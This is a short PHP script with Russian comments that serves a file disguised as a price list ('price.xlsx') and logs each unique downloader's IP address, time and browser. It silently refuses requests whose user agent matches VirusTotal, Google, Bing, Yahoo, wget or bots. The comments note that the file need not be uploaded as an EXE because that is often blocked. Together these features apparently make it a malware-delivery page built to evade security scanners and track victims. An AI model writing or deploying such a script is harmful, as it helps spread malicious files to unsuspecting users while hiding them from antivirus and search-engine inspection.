<?php
   // ЗАДАЙТЕ ОСНОВНЫЕ ОПЦИИ ============================================================================== 
   
   $filename = 'price.xlsx'; /* файл для отдачи !!! ДОЛЖЕН ЛЕЖАТЬ РЯДОМ СО СКРИПТОМ !!! 
                              его не обязательно лить на сервер как ЕХЕ - часто это запрещено! */
                
   $Log_only_IP = false;   /* true - писать в лог только IP; 
                              false - расширенная статистика и подсчет уникальных IP */

   // Дополнительные опции (можно ничего не менять) =======================================================
   
   $expfilename = 'price.xlsx'; // имя файла при отдаче скриптом
   $logfile = 'stats.txt'; // куда писать лог
   date_default_timezone_set('Europe/Moscow'); // часовой пояс для записи даты и времени в расширенный лог
   set_time_limit(0); // время выполнения скрипта, 0 - не ограничено
   
   // Основной код скрипта - лучше ничего не трогать ======================================================

   $ip = $_SERVER['REMOTE_ADDR']; $user_agent = $_SERVER['HTTP_USER_AGENT']; 
   if ($user_agent == '') { $user_agent = 'NOT SENT'; }
   if(preg_match('/(virustotalcloud|google|wget|yahoo|bing|bot)/i', strtolower($user_agent))) { exit(); }
   
   header("Content-type: application/octet-stream");
   header("Content-disposition: attachment;filename=". $expfilename);
   readfile($filename);

   $handle = @fopen($logfile, 'a+');
   $log = @fread($handle,  filesize($logfile));

   if ($Log_only_IP == true) {
   
   if ($log == '') { @chmod($logfile, 0777); }
   if (strpos($log, $ip) === false) { @fwrite($handle, $ip."\r\n"); @fclose($handle); }
   
   } else {
   if (strpos($log, $ip) === false) {
   if ($log == '') { @chmod($logfile, 0777); @fwrite($handle, '1) '); } else { @fwrite($handle, 1+count(file($logfile)).') '); }
   @fwrite($handle, "IP: ".$ip." +++++ Date/Time: ".date("d.m.Y H:i:s")." +++++ User Agent: ".$user_agent."\r\n");
   @fclose($handle); }   
   }
?>